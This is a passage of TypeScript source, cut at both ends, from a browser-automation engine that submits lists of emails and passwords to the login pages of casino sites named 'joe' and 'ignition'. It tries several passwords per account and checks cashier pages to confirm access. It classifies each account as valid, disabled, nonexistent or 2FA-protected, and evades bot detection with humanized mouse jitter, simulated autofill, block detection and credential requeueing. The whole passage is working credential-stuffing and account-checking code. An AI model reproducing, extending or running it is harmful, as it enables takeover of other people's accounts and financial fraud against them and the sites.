      // has fully settled on verifyUrl. `captureSettledScreenshot` issues a
      // second networkidle wait + 900ms DOM-settle pause immediately before
      // page.screenshot() so the visual record reflects the final
      // authenticated cashier state — never a transitional redirect or a
      // loading spinner. The label is verdict-aware so the audit trail
      // distinguishes "success-confirmed-at-cashier" from
      // "verification-cashier-unconfirmed" without having to parse outcomes.
      const verifiedLabel = verified === "success"
        ? `${site.name}:success-confirmed-at-cashier`
        : `${site.name}:verification-cashier-unconfirmed`;
      await this.captureSettledScreenshot(page, verifiedLabel, 900, true, snapCtx);
      this.log("INFO", `  📸 Verification screenshot captured at ${site.name} cashier (${verified === "success" ? "success" : "unconfirmed"})`);
      return verified;
    } catch (e: unknown) {
      this.log("WARN", `  Verification navigation failed: ${e instanceof Error ? e.message : String(e)}`);
      return undefined;
    } finally {
      page.off("framenavigated", bounceListener);
    }
  }

  private async executeLoginFlowInner(
    page: Page,
    site: SiteConfig,
    cred: Credential,
    batchIndex: number,
    _postLoadDelaySeconds: number,
    getNetworkDetection: () => LoginResponse | null,
    resetNetworkDetection: () => void,
    _proxyKey?: string,
    ignitionVerifBypass?: boolean,
    effectiveBackend?: string,
    _isSessionReused: boolean = false
  ): Promise<LoginFlowResult> {
    if ((page as any).__sessionId) {
      codegenExporter.startSession((page as any).__sessionId, site.name);
    }

    const flowStep = <T>(name: string, loc: string, action: () => Promise<T>) =>
      this.executeFlowStep(name, loc, action, { email: cred.email, site: site.name, sessionId: (page as any).__sessionId ?? "unknown" })
        .then(async (result) => {
          // Flow-step screenshot capture (non-blocking)
          if (this._flowScreenshotter.isActive && !page.isClosed()) {
            await this._flowScreenshotter.capture(page, name).catch(() => { });
          }
          return result;
        });

    // ── Start flow screenshot session if enabled ──
    if (this.config?.captureFlowSteps) {
      const sessionId = (page as any).__sessionId ?? `flow-${Date.now()}`;
      this._flowScreenshotter.start(sessionId, cred.email, site.name, effectiveBackend ?? this.config?.backend ?? "unknown");
    }

    // --- COOKIE GUARD: Install speed layer early (before navigation) ---
    // The initScript CSS-hide layer doesn't need selectors — it runs on every
    // DOM mutation to hide cookie overlays the instant they appear.
    // The full CookieGuard (with form selector verification) is created after
    // selectors resolve below.
    let cookieGuard: CookieGuard | undefined; // eslint-disable-line prefer-const
    let submitTracker: SubmitButtonStateTracker | undefined; // eslint-disable-line prefer-const
    {
      // Temporary CookieGuard just for the initScript install
      const earlyGuard = new CookieGuard(page, {
        formSelectors: { username: 'input[type="email"]', password: 'input[type="password"]' },
        siteName: site.name,
        maxWaitMs: 15000,
      });
      await earlyGuard.install();
      // earlyGuard is discarded — the real guard is created after selectors resolve
    }

    // ── Navigate to login page (with fallback & retry) ──
    let origin: string;
    try {
      origin = await flowStep(
        "Navigate to site",
        "engine.ts:4869",
        async () => {
          const res = await this.gotoWithFallback(page, site);

          // Apex Enhancement #9: Pre-emptive Block Detection
          if (res && res.response) {
            const blockPrediction = await analyzeInitialResponse(res.response, site.name);
            if (blockPrediction.isLikelyBlocked) {
              this.log("WARN", `🚨 Pre-emptive block detected during nav: ${blockPrediction.reason}`);
              throw new PreemptiveBlockError(`Nav block: ${blockPrediction.reason}`);
            }
          }

          return res.origin;
        }
      );

      // Secondary check post-load
      const resourcePrediction = await analyzePageResources(page, site.name);
      if (resourcePrediction.isLikelyBlocked) {
        this.log("WARN", `🚨 Pre-emptive block detected post-load: ${resourcePrediction.reason}`);
        throw new PreemptiveBlockError(`Resource block: ${resourcePrediction.reason}`);
      }

      this.log("DEBUG", `[FLOW DEBUG] ✅ executeFlowStep Navigation completed`);
      if (site.verifyUrl && site.verifyUrl.startsWith("/")) {
        site.verifyUrl = origin + site.verifyUrl;
      }
    } catch (e: unknown) {
      if (e instanceof PreemptiveBlockError) {
        this.log("WARN", `  ${site.name}: Preemptive TLS/Proxy block detected!`);
        throw e;
      }
      this.log("ERR", `  ${site.name}: Navigation failed: ${(e instanceof Error ? e.message : String(e)) || String(e)}`);
      throw e;
    }

    // (Early Remember Me logic has been moved to an addInitScript above navigation)

    // ── Pre-login warmups have been completely removed for maximum speed ──

    // ── Resolve selectors (configured first, auto-detect fallback) ──
    const selectors = await flowStep(
      "Resolve Selectors",
      "engine.ts:4910",
      async () => this.resolveSelectors(page, site)
    );

    // --- FULL GUARD CREATION (needs resolved selectors) ---
    cookieGuard = new CookieGuard(page, { // eslint-disable-line prefer-const
      formSelectors: { username: selectors.username, password: selectors.password },
      siteName: site.name,
      maxWaitMs: 15000,
    });
    // Re-install with the real selectors (initScript was already installed by earlyGuard)
    // The install is idempotent — won't re-inject if already installed
    await cookieGuard.install();

    submitTracker = new SubmitButtonStateTracker(page, { // eslint-disable-line prefer-const
      submitSelector: selectors.submit,
      emailSelector: selectors.username,
      passwordSelector: selectors.password,
      siteName: site.name,
      readyBufferMs: 500,
    });

    const evidenceMode = this.config?.evidenceMode === true || ["1", "true", "yes", "on"].includes((process.env.AUTOMATION_EVIDENCE_MODE || "").toLowerCase());
    const evidenceGate = {
      videoPresent: evidenceMode && Boolean(page.video()),
      evidenceComplete:
        evidenceMode &&
        Boolean(page.video()) &&
        this.config?.enablePlaywrightTracing === true &&
        this.config?.useVisionCoordinates === true &&
        this.config?.enableVerification !== false,
      dryRun: this.config?.dryRun === true || ["1", "true", "yes", "on"].includes((process.env.AUTOMATION_DRY_RUN || "").toLowerCase()),
    };
    await page.addInitScript((gate) => {
      (window as any).__automatiEvidenceGate = gate;
    }, evidenceGate).catch(() => {});
    await page.evaluate((gate) => {
      (window as any).__automatiEvidenceGate = gate;
    }, evidenceGate).catch(() => {});

    // ── Fill email (mode-aware: autofill default, keyboard if toggled) ──
    const vp = page.viewportSize() || { width: 1280, height: 720 };
    const usernameInputOverride: "instant" | undefined = (site.name === "joe" || site.name === "ignition") ? "instant" : undefined;

    let targetEmail = cred.email;
    if (site.name === "joe" && (cred as any)._synthetic_golden_joe) targetEmail = (cred as any)._synthetic_golden_joe;
    if (site.name === "ignition" && (cred as any)._synthetic_golden_ignition) targetEmail = (cred as any)._synthetic_golden_ignition;
    const evidenceRunId = `${site.name}-${emailToFingerprintSeed(targetEmail)}-${Date.now()}`;

    // ── Build password sequence ──
    let credPasswords = cred.passwords;
    if (site.name === "joe" && (cred as any)._synthetic_golden_joe_pass) credPasswords = [(cred as any)._synthetic_golden_joe_pass];
    if (site.name === "ignition" && (cred as any)._synthetic_golden_ignition_pass) credPasswords = [(cred as any)._synthetic_golden_ignition_pass];

    const passwords = this.buildPasswordSequence(credPasswords, batchIndex);
    if (passwords.length === 0) {
      this.log("WARN", `  ${site.name}: no passwords available for batch ${batchIndex} — skipping`);
      return { outcome: "skipped", attempts: 0, reason: "no-creds" };
    }
    const hasAltPw = credPasswords.length > 1;
    this.log("INFO", `  ${site.name}: batch ${batchIndex} · ${hasAltPw ? "multi-password" : "single + fallbacks"} \u2014 ${passwords.length} attempts`);

    // ── Idle Mouse Move pre-submit removed for maximum speed ──

    // ── Password retry loop ──
    let lastResponse: LoginResponse | null = null;
    let otherRewindUsed = false;
    const submitEvidence: SubmitAcceptanceEvidence[] = [];
    const setLatestResponseClass = (responseClass: SubmitAcceptanceEvidence["responseClass"]): void => {
      const latest = submitEvidence[submitEvidence.length - 1];
      if (latest) latest.responseClass = responseClass;
    };
    const finalizeEvidenceClassification = async (): Promise<LoginFlowResult> => {
      const gate = await page.evaluate(() => {
        const metadata = (window as any).__automatiEvidenceGate as {
          videoPresent?: boolean;
          evidenceComplete?: boolean;
          dryRun?: boolean;
        } | undefined;
        return {
          videoPresent: metadata?.videoPresent === true,
          evidenceComplete: metadata?.evidenceComplete === true,
          dryRun: metadata?.dryRun === true,
        };
      }).catch(() => ({ videoPresent: false, evidenceComplete: false, dryRun: true }));
      const decision = classifyAccountEvidence(submitEvidence, {
        ...gate,
        actionCount: submitEvidence.filter((item) => item.invoked).length,
      });
      let outcome: Outcome;
      switch (decision.outcome) {
        case "TEMP_DISABLED_ACCOUNT_EXISTS":
          outcome = "tempdisabled";
          break;
        case "PERM_DISABLED_ACCOUNT_EXISTS":
          outcome = "permdisabled";
          break;
        case "SUCCESSFUL_LOGIN":
          outcome = "success";
          break;
        case "NO_ACCOUNT_CONFIRMED":
          outcome = "noaccount";
          break;
        default:
          outcome = "inconclusive";
      }
      return {
        outcome,
        attempts: decision.invocationCount,
        reason: decision.reason,
        canonicalOutcome: decision.outcome,
        submitEvidence: [...submitEvidence],
        selectorProvenance: selectors.provenance,
        entryVariant: this.config?.loginEntryVariant ?? "input_text",
        acceptanceVariant: this.config?.loginAcceptanceVariant ?? "request_response_dom_acceptance",
      };
    };
    let ignitionResets = 0;
    let noResponseFullRestarts = 0; // Max 2 full restarts before burning session
    const mutationRetryCounts = new Map<number, number>();
    for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
      const pw = passwords[attemptIdx];
      const attemptNum = attemptIdx + 1;

      // ── Context Reuse / Page Recycling ──
      if (attemptIdx > 0) {
        // If the page has moved away from the login form, re-navigate
        const currentPath = new URL(page.url()).pathname.toLowerCase();
        const loginPath = new URL(site.url).pathname.toLowerCase();
        if (currentPath !== loginPath) {
          this.log("DEBUG", `  Re-navigating to login page for retry: ${site.url}`);
          await this.gotoWithFallback(page, site, 1).catch(() => { });
        }
      }

      // ── Pre-attempt "Login Verification" Check ──
      const inPageVerdict = await page.evaluate(() => {
        const STATUS_SYM = Symbol.for("cloak_status");
        return (window as any)[STATUS_SYM] ?? null;
      }).catch(() => null);
      let response: LoginResponse | null = inPageVerdict === "ignition-verification" ? "ignition-verification" : null;

      if (!response) {
        if (attemptIdx > 0 && lastResponse === "other") {
          try {
            const vanished = await page.evaluate(
              ({ submitSel, passwordSel }: { submitSel: string, passwordSel: string }) => {
                if (!submitSel || !passwordSel) return false;
                return !document.querySelector(submitSel) && !document.querySelector(passwordSel);
              },
              { submitSel: selectors.submit, passwordSel: selectors.password }
            );
            const urlMoved = this.isUrlChangedAwayFromLogin(site.url, page.url());
            if (vanished || urlMoved) {
              const rootRedirectVerification = await this.confirmRootRedirectViaCashier(page, site, `late success before attempt ${attemptNum}`);
              if (rootRedirectVerification === "success") {
                this.log("INFO", `  ${site.name}: ✅ cashier-confirmed root redirect before attempt ${attemptNum}`);
                return { outcome: "success", attempts: attemptIdx };
              }
              if (rootRedirectVerification === "unconfirmed") {
                lastResponse = "other";
                continue;
              }
              this.log("INFO", `  ${site.name}: ✅ late success detected before attempt ${attemptNum} (vanished=${vanished} urlMoved=${urlMoved})`);
              await this.captureScreenshot(page, `${site.name}:late-success`, { email: cred.email, target: site.name });
              return { outcome: "success", attempts: attemptIdx };
            }
          } catch { /* page closed — fall through */ }
        }

        const tFillStart = Date.now();
        try {
          // ── 12% chance: simulate Chrome autofill (saved credentials) ──
          let chosenSubmitMethod = "click";
          let success = false;
          let universalEvidenceHandled = false;

          await flowStep("Setup Submit Mutation Observer", "engine.ts:setupSubmitObserver", async () => setupSubmitMutationObserver(page, selectors.submit, selectors.username));

          // Install SubmitButtonStateTracker's in-page observer
          await submitTracker.install();

          if (site.name === "joe" || site.name === "ignition") {
            this.log("DEBUG", `[FLOW DEBUG] ⏳ Starting universalLoginFlow`);
            let choreoTimer: NodeJS.Timeout;
            const result = await Promise.race([
              this.executeFlowStep(
                "Execute Universal Login Flow",
                "engine.ts:5084",
                async () => universalLoginFlow({
                  page,
                  siteName: site.name,
                  targetEmail,
                  password: pw!,
                  attemptIdx,
                  selectors,
                  inputText: (p, sel, val) => this.inputText(p, sel, val),
                  simulateAutofill: (p, eSel, pSel, e, pass) => simulateAutofill(p, eSel, pSel, e, pass),
                  useVisionCoordinates: !!this.config?.useVisionCoordinates,
                  viewport: vp,
                  backend: effectiveBackend ?? this.config?.backend ?? "unknown",
                  mode: "stealth-humanized",
                  cookieGuard,
                  submitTracker,
                  cashierPath: site.verifyUrl,
                  primarySubmitVariation: this.config?.primarySubmitVariation,
                  discoveryProvenance: selectors.provenance,
                  entryVariant: this.config?.loginEntryVariant ?? "input_text",
                  acceptanceVariant: this.config?.loginAcceptanceVariant ?? "request_response_dom_acceptance",
                  runId: evidenceRunId,
                  attemptId: `${evidenceRunId}-${attemptNum}`,
                })
              ),
              new Promise<any>((_, rej) => { choreoTimer = setTimeout(() => rej(new Error("Choreography timeout")), 120000); })
            ]).finally(() => { if (choreoTimer) clearTimeout(choreoTimer); });
            this.log("DEBUG", `[FLOW DEBUG] ✅ Completed universalLoginFlow`);
            success = result.success;
            universalEvidenceHandled = true;
            if (result.acceptanceEvidence) {
              submitEvidence.push(result.acceptanceEvidence);
            }
            if (result.networkVerdict) {
              this.log("INFO", `  ${site.name}: network evidence verdict=${result.networkVerdict}; continuing through authoritative envelope unless terminal`);
              switch (result.networkVerdict) {
                case "success":
                  response = "success";
                  break;
                case "temporarily_disabled":
                case "tempdisabled":
                  response = "tempdisabled";
                  break;
                case "permanently":
                case "disabled":
                case "permdisabled":
                  response = "disabled";
                  break;
                case "incorrect":
                case "noaccount":
                  response = "incorrect";
                  break;
                case "2FA":
                  response = "authenticator";
                  break;
                default:
                  response = "other";
              }
            }
            if (result.submitMethod) chosenSubmitMethod = result.submitMethod;
          } else {
            // Legacy generic site logic
            let usernameOk = false;
            let passwordOk = false;
            let usedAutofill = false;
            
            if (attemptIdx === 3) {
              // Attempt 4: Do not clear, do not fill
              this.log("INFO", `  ${site.name}: Attempt 4 (Legacy) - Preserving existing password in field.`);
              usernameOk = true;
              passwordOk = true;
            } else {
              if (attemptIdx === 0 && Math.random() < 0.12 && !usernameInputOverride) {
                try {
                  usedAutofill = await simulateAutofill(page, selectors.username, selectors.password, cred.email, pw!);
                  if (usedAutofill) {
                    this.log("INFO", `  ${site.name}: 🔑 Chrome autofill simulation`);
                    usernameOk = true;
                    passwordOk = true;
                  }
                } catch { usedAutofill = false; }
              }
              if (!usedAutofill) {
                usernameOk = await flowStep("Input Username", "engine.ts:5098", async () => this.inputText(page, selectors.username, targetEmail));
                passwordOk = await flowStep("Input Password", "engine.ts:5099", async () => this.inputText(page, selectors.password, pw!));
              }
            }
            
            // (strict-early-remember-me is handled globally immediately upon page load)
            try {
              await page.mouse.click(vp.width - 10, vp.height - 10);
              await this.sleep(20);
            } catch { /* intentional */ }
            
            success = usernameOk && passwordOk;
            if (success) {
              const gateStart = Date.now();
              try {
                await flowStep(
                  "Wait for Submit Ready Gate",
                  "engine.ts:5031",
                  async () => {
                    await page.waitForFunction((args: { sel: string }) => {
                      let el: HTMLElement | null = null;
                      try { el = document.querySelector(args.sel); } catch { return true; }
                      if (!el) return true;
                      if ((el as HTMLButtonElement).disabled) return false;
                      if (el.getAttribute("aria-disabled") === "true") return false;
                      if (el.getAttribute("aria-busy") === "true") return false;
                      const spinnerSel = '[class*="spin" i],[class*="loader" i],[class*="loading" i],[role="progressbar"],[class*="lds-" i],svg[class*="animate" i]';
                      if (el.querySelector(spinnerSel)) return false;
                      const txt = (el.textContent || "").trim().toLowerCase();
                      if (/loading|signing|please wait|processing|verifying|submitting|authenticat/i.test(txt)) return false;
                      const style = window.getComputedStyle(el);
                      if (style.pointerEvents === "none" || style.visibility === "hidden" || style.display === "none") return false;
                      const op = parseFloat(style.opacity || "1");
                      if (!isNaN(op) && op < 0.5) return false;
                      const rect = el.getBoundingClientRect();
                      if (rect.width < 4 || rect.height < 4) return false;
                      return true;
                    }, { sel: selectors.submit }, { timeout: Math.min(DynamicTimings.SUBMIT_READY_GATE_TIMEOUT, 5000), polling: DynamicTimings.SUBMIT_READY_GATE_POLL });
                  }
                );
                this.log("INFO", `  ${site.name}: submit ready gate cleared in ${Date.now() - gateStart}ms`);
              } catch {
                this.log("WARN", `  ${site.name}: submit ready gate timed out after ${Date.now() - gateStart}ms — proceeding anyway`);
              }
              await this.clickShowPassword(page, site.name, selectors.password);
              resetNetworkDetection();
              await page.evaluate(() => {
                const STATUS_SYM = Symbol.for("cloak_status");
                (window as any)[STATUS_SYM] = null;
              }).catch(() => { });

              const submitBox = await page.locator(selectors.submit).boundingBox().catch(() => null);
              if (submitBox) {
                const offsetX = gaussianClamped(0, 1.5, -4, 4);
                const offsetY = gaussianClamped(0, 1.5, -4, 4);
                await humanMouseMove(page, submitBox.x + submitBox.width / 2 + offsetX, submitBox.y + submitBox.height / 2 + offsetY);
                await injectMicroTremor(page, submitBox.x + submitBox.width / 2, submitBox.y + submitBox.height / 2, Math.round(gaussianClamped(100, 50, 30, 300)));
              } else {
                await page.hover(selectors.submit, { force: true });
              }

              // Use high-fidelity human click
              const submitResult = await flowStep("Execute Human Click", "engine.ts:6041", async () => {
                await simulateHumanClick(page, selectors.submit);
                return { tier: "simulateHumanClick" };
              });
              if (submitResult && typeof submitResult === 'object' && 'tier' in submitResult) {
                chosenSubmitMethod = submitResult.tier;
              }
            }
          }

          if (!success) {
            this.log("WARN", `  ${site.name}: ⌨ credential drift unrecoverable on attempt ${attemptNum} — skipping submit`);
            await this.captureSettledScreenshot(page, `${site.name}:attempt-${attemptNum}-drift-abort`, 200, false, { email: cred.email, target: site.name });
            await this.smartAttemptPause(page);
            continue;
          }
          // Invocation counting is evidence-ledger based. A physical action alone never increments acceptance.

          // Extra details for Golden Benchmark & Matrix Fusion
          let evalTimer: NodeJS.Timeout;
          const coordsAndMatrix = await Promise.race([
            page.evaluate(({ userSel, passSel, submitSel }) => {
              const getBox = (sel: string) => {
                const el = document.querySelector(sel);
                if (!el) return null;
                const { x, y, width, height } = el.getBoundingClientRect();
                return { x: Math.round(x), y: Math.round(y), w: Math.round(width), h: Math.round(height) };
              };
              return {
                coords: { user: getBox(userSel), pass: getBox(passSel), submit: getBox(submitSel) },
                matrix: (window as any).__automatiTimelineMatrix || {}
              };
            }, { userSel: selectors.username, passSel: selectors.password, submitSel: selectors.submit }).catch(() => null),
            new Promise<any>((_, rej) => { evalTimer = setTimeout(() => rej(new Error("Evaluate timeout")), 3000); })
          ]).finally(() => { if (evalTimer) clearTimeout(evalTimer); }).catch(() => null);

          this.log("INFO", `  ${site.name}: [CDP Metrics] submitMethod=canonical | FillTime: ${Date.now() - tFillStart}ms | Timeline Matrix: ${JSON.stringify(coordsAndMatrix?.matrix)}`);

          if (coordsAndMatrix?.matrix && Object.keys(coordsAndMatrix.matrix).length > 0) {
            this.emit("telemetry_matrix", {
              email: cred.email,
              target: site.name,
              backend: this.config?.backend || "unknown",
              fillTime: Date.now() - tFillStart,
              matrix: coordsAndMatrix.matrix,
              currentTimings: DynamicTimings
            });
          }

          this.log("INFO", `  ${site.name}: 🖱 Submitted via canonical ${chosenSubmitMethod}`);

          if (!universalEvidenceHandled) {
            const apiPromise = page.waitForResponse(res => res.url().includes('/api') || res.url().includes('/login'), { timeout: DynamicTimings.POST_CLICK_RACE_DELAY }).catch(() => { });
            const navPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: DynamicTimings.POST_CLICK_RACE_DELAY }).catch(() => { });
            const postScrollPromise = maybePostSubmitScroll(page);
            await Promise.race([apiPromise, navPromise]);
            await postScrollPromise.catch(() => { });
          }
          // tClickEnd removed (unused)
        } catch (interactErr: unknown) {
          const msg = (interactErr instanceof Error ? interactErr.message : String(interactErr)) || String(interactErr);
          this.log("WARN", `  ${site.name}: Interaction error on attempt ${attemptNum}: ${msg}`);
          const isElementErr = /element not found|timeout|waiting for selector|locator|target closed/i.test(msg);
          if (isElementErr && attemptIdx > 0) {
            try {
              const vanished = await page.evaluate(
                ({ submitSel, passwordSel }: { submitSel: string, passwordSel: string }) => {
                  if (!submitSel || !passwordSel) return false;
                  return !document.querySelector(submitSel) && !document.querySelector(passwordSel);
                },
                { submitSel: selectors.submit, passwordSel: selectors.password }
              ).catch(() => false);
              const urlMoved = this.isUrlChangedAwayFromLogin(site.url, page.url());
              if (vanished || urlMoved) {
                const rootRedirectVerification = await this.confirmRootRedirectViaCashier(page, site, `mid-attempt vanish on attempt ${attemptNum}`);
                if (rootRedirectVerification === "success") {
                  this.log("INFO", `  ${site.name}: ✅ cashier-confirmed root redirect on attempt ${attemptNum}`);
                  return { outcome: "success", attempts: attemptIdx };
                }
                if (rootRedirectVerification === "unconfirmed") {
                  lastResponse = "other";
                  continue;
                }
                this.log("INFO", `  ${site.name}: ✅ mid-attempt vanish success on attempt ${attemptNum} (vanished=${vanished} urlMoved=${urlMoved})`);
                await this.captureScreenshot(page, `${site.name}:mid-vanish-success`, { email: cred.email, target: site.name });
                return { outcome: "success", attempts: attemptIdx };
              }
            } catch { /* page closed */ }
          }
          
          // Rule §6 Enforcement: Exactly 4 valid attempts MUST occur.
          const repairCount = mutationRetryCounts.get(attemptIdx) || 0;
          if (repairCount >= 3) {
            this.log("ERROR", `  ${site.name}: Max repair retries exceeded for attempt ${attemptNum}. Breaking loop.`);
            throw interactErr;
          }
          mutationRetryCounts.set(attemptIdx, repairCount + 1);
          this.log("ERROR", `  ${site.name}: Attempt ${attemptNum} failed due to interaction error. Retrying attempt (Attempt does not count).`);
          await this.smartAttemptPause(page);
          attemptIdx--; // Retry same attempt
          continue;
        }

        let fastStatus: LoginResponse | null = null;
        const pollStart = Date.now();
        const uiRace = page.waitForFunction(
          () => {
            const STATUS_SYM = Symbol.for("cloak_status");
            return (window as any)[STATUS_SYM] ?? null;
          },
          null,
          { timeout: DynamicTimings.FAST_RACE_WINDOW, polling: DynamicTimings.FAST_RACE_POLL }
        ).then(async (h) => (await h.jsonValue()) as LoginResponse).catch(() => null);

        let netStatus: LoginResponse | null = null;
        while (Date.now() - pollStart < DynamicTimings.FAST_RACE_WINDOW) {
          if (page.isClosed()) break;
          netStatus = getNetworkDetection();
          if (netStatus) {
            let uiTimer: NodeJS.Timeout;
            fastStatus = await Promise.race([
              uiRace,
              new Promise<null>((r) => { uiTimer = setTimeout(() => r(null), 400); })
            ]).finally(() => { if (uiTimer) clearTimeout(uiTimer); });
            if (!fastStatus) fastStatus = netStatus;
            break;
          }
          await new Promise((r) => setTimeout(r, DynamicTimings.FAST_RACE_POLL));
        }
        if (!fastStatus) fastStatus = (await uiRace) || getNetworkDetection();

        const urlMovedAfterSubmit = this.isUrlChangedAwayFromLogin(site.url, page.url());

        // --- NEW MUTATION OBSERVER LOGIC ---
        // If we haven't already detected a fast success/status, and the URL hasn't moved,
        // we check the submit mutation result to see if an error message actually appeared.
        let skippedByMutation = false;
        if (!fastStatus && !urlMovedAfterSubmit) {
          const mutationResult = await flowStep("Wait For Submit Mutation", "engine.ts:waitForMutation", async () => waitForSubmitMutationResult(page, 2000));

          // If the error text didn't change (swallowed), or if it DID change but it's the very first attempt (likely cookie notice intercepting click)
          const isFirstAttemptCookieIntercept = mutationResult && mutationResult.errorVaried && attemptIdx === 0;
          const isSubmitSwallowed = mutationResult && !mutationResult.errorVaried;

          if (isSubmitSwallowed || isFirstAttemptCookieIntercept) {
            const retryCount = mutationRetryCounts.get(attemptIdx) || 0;
            if (retryCount >= 2) {
              this.log("WARN", `  ${site.name}: ⚠ Max mutation retries (2) reached — classifying as incorrect`);
              response = "incorrect";
            } else {
              mutationRetryCounts.set(attemptIdx, retryCount + 1);
              const reason = isFirstAttemptCookieIntercept ? "Error banner on first attempt (likely cookie intercept)" : "Submit swallowed";
              this.log("WARN", `  ${site.name}: ⚠ ${reason} (retry ${retryCount + 1}/2) — resubmitting same password`);
              lastResponse = null;
              resetNetworkDetection();
              attemptIdx--; // Resubmit SAME password
              skippedByMutation = true;
            }
          }
        }

        if (skippedByMutation) {
          continue;
        }

        const timeout = attemptIdx === 2 ? DynamicTimings.RESPONSE_TIMEOUT_LAST_ATTEMPT : DynamicTimings.RESPONSE_TIMEOUT_DEFAULT;
        response = fastStatus || await flowStep(
          "Wait For Login Response",
          "engine.ts:5290",
          async () => this.waitForLoginResponse(
            page, timeout, site.url, selectors.submit, selectors.password, site.name,
          )
        );
      }

      // ── Blueprint ACT III Phase 2: 1500ms Render Cushion (CRITICAL) ──────────
      // React needs this precise time window to animate and render lazy-loaded
      // pop-ups (MFA inputs, modals) that override the JSON API response.
      // The MutationObserver is re-polled after the cushion so late-arriving
      // modal triggers (AUTHENTICATOR, VERIFY YOUR PHONE, etc.) can override
      // the initial classification. Per the Universal Master Blueprint.
      if (response !== "disabled" && response !== "tempdisabled") {
        await this.sleep(1500);
        const postCushionVerdict = await page.evaluate(() => {
          const STATUS_SYM = Symbol.for("cloak_status");
          return (window as any)[STATUS_SYM] ?? null;
        }).catch(() => null);
        if (postCushionVerdict && (response === "other" || response === "incorrect" || response === "success" || !response)) {
          this.log("INFO", `  ${site.name}: 🔄 Render cushion detected late modal: ${response} → ${postCushionVerdict}`);
          response = postCushionVerdict as LoginResponse;
        }
      }

      // ── NO-RESPONSE HANDLING FLOW ──────────────────────────────────────────
      // When a login submit gets ZERO response (no network verdict, no
      // cloak_status, no DOM change), the submit may have been silently
      // swallowed (e.g. cookie banner intercepted the click). This flow:
      //   1. 5s watch window for late success/error indicators
      //   2. If error banner → CMP dismiss → full restart (max 2)
      //   3. If nothing → re-press login button + 5s wait (max 3 re-presses)
      //   4. After 3 re-presses → cashier fallback check
      if (!response || response === "other" || response === "timeout") {
        this.log("WARN", `  ${site.name}: ⚠ No response detected after attempt ${attemptNum} — entering no-response handling`);
        let noResponseResolved = false;

        // ── 5s Watch Window: poll for late indicators ──
        const NO_RESPONSE_WATCH_MS = 5000;
        const NO_RESPONSE_POLL_MS = 200;
        const watchStart = Date.now();
        while (Date.now() - watchStart < NO_RESPONSE_WATCH_MS && !noResponseResolved) {
          if (page.isClosed()) break;

          // Check for late success indicator
          const lateStatus = await page.evaluate(() => {
            const STATUS_SYM = Symbol.for("cloak_status");
            return (window as any)[STATUS_SYM] ?? null;
          }).catch(() => null);

          if (lateStatus === "success") {
            this.log("INFO", `  ${site.name}: ✅ Late success indicator appeared during no-response watch`);
            response = "success";
            noResponseResolved = true;
            break;
          }

          // Check for late error banner (incorrect/alert)
          if (lateStatus === "incorrect" || lateStatus) {
            this.log("INFO", `  ${site.name}: 🚨 Late indicator appeared during no-response watch: ${lateStatus}`);
            response = lateStatus as LoginResponse;
            noResponseResolved = true;
            break;
          }

          // Check network detection
          const netDet = getNetworkDetection();
          if (netDet) {
            this.log("INFO", `  ${site.name}: 📡 Late network detection during no-response watch: ${netDet}`);
            response = netDet;
            noResponseResolved = true;
            break;
          }

          // Check for visible error alert in DOM
          const alertVisible = await page.evaluate(() => {
            const alerts = document.querySelectorAll('.ol-alert, [role="alert"], .error-message, .alert-danger');
            for (const a of alerts) {
              if ((a as HTMLElement).offsetParent !== null) return true;
            }
            return false;
          }).catch(() => false);

          if (alertVisible) {
            this.log("INFO", `  ${site.name}: 🚨 Error banner detected during no-response watch`);
            response = "incorrect";
            noResponseResolved = true;
            break;
          }

          await new Promise(r => setTimeout(r, NO_RESPONSE_POLL_MS));
        }

        // ── Error Banner Path: CMP dismiss → full restart ──
        if (noResponseResolved && response === "incorrect") {
          if (noResponseFullRestarts < 2) {
            noResponseFullRestarts++;
            this.log("WARN", `  ${site.name}: 🔄 Error banner during no-response — CMP dismiss + full restart ${noResponseFullRestarts}/2 with same password`);

            // Re-run CMP dismissal cascade
            await page.evaluate(() => {
              try { (window as any).CookieInformation?.submitAllCategories?.(); } catch { /* intentional */ }
            }).catch(() => {});
            for (const cmpSel of ['.coi-banner__accept', '[data-coi-btn="accept"]', 'button:has-text("ACCEPT ALL")', 'button:has-text("Accept")']) {
              try {
                const btn = page.locator(cmpSel).first();
                if (await btn.isVisible({ timeout: 300 }).catch(() => false)) {
                  await btn.click({ timeout: 1000 });
                  this.log("INFO", `  ${site.name}: ✅ CMP dismissed via ${cmpSel} during no-response restart`);
                  break;
                }
              } catch { /* intentional */ }
            }
            await page.evaluate(() => {
              for (const el of document.querySelectorAll('.coi-banner, .coi-consent-banner, [id*="cookie"], [class*="cookie-banner"]')) {
                (el as HTMLElement).style.setProperty('display', 'none', 'important');
              }
            }).catch(() => {});

            // Reset cloak_status and restart with same password at attempt 0 (full choreography)
            resetNetworkDetection();
            await page.evaluate(() => {
              const STATUS_SYM = Symbol.for("cloak_status");
              (window as any)[STATUS_SYM] = null;
            }).catch(() => {});

            // Rewind: set attemptIdx to -1 so the loop increments it to 0 (attempt #1)
            // and replace passwords[0] with the current swallowed password
            passwords[0] = pw!;
            attemptIdx = -1; // Will become 0 after loop increment
            lastResponse = null;
            this.log("INFO", `  ${site.name}: ↩ Rewinding to attempt #1 with same password for full choreography restart`);
            continue;
          } else {
            // 2 full restarts exhausted — burn session like misdirection
            this.log("WARN", `  ${site.name}: 🔥 2 full restarts exhausted — burning session (misdirection treatment)`);
            return {
              outcome: "pin-misdirection",
              attempts: attemptNum,
              misdirection: { url: page.url(), trigger: "NO_RESPONSE_RESTART_EXHAUSTED" },
              requeueCredential: true,
            };
          }
        }

        // ── Re-press Loop: no indicator at all after 5s ──
        if (!noResponseResolved) {
          const MAX_REPRESSES = 3;
          for (let repress = 0; repress < MAX_REPRESSES; repress++) {
            this.log("WARN", `  ${site.name}: 🔁 No-response re-press ${repress + 1}/${MAX_REPRESSES}`);

            // Re-click the submit button
            const submitBox = await page.locator(selectors.submit).boundingBox().catch(() => null);
            if (submitBox) {
              const cx = submitBox.x + submitBox.width / 2;
              const cy = submitBox.y + submitBox.height / 2;
              await page.mouse.click(cx, cy);
            } else {
              await page.locator(selectors.submit).click({ force: true, timeout: 2000 }).catch(() => {});
            }

            // 5s watch after re-press
            const repressWatchStart = Date.now();
            let repressResolved = false;
            while (Date.now() - repressWatchStart < NO_RESPONSE_WATCH_MS && !repressResolved) {
              if (page.isClosed()) break;

              const status = await page.evaluate(() => {
                const STATUS_SYM = Symbol.for("cloak_status");
                return (window as any)[STATUS_SYM] ?? null;
              }).catch(() => null);

              if (status) {
